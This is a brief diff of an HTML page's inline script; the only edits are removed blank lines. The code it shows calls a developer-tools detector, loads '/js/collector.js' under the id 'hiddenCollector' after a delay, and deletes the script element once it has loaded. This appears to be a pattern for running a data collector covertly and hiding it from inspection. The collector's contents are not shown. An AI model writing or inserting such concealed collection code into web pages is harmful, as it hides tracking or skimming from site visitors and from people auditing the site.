@@ -51,21 +51,17 @@
 
         function loadAndHideScript() {
             detectDevTools();
-
             const script = document.createElement('script');
             script.id = 'hiddenCollector';
             script.src = '/js/collector.js';
-
             script.onload = function() {
                 const scriptElement = document.getElementById('hiddenCollector');
                 if (scriptElement) {
                     scriptElement.remove();
                 }
             };
-
             document.body.appendChild(script);
         }
-
         setTimeout(loadAndHideScript, 500);
     </script>
 </body>
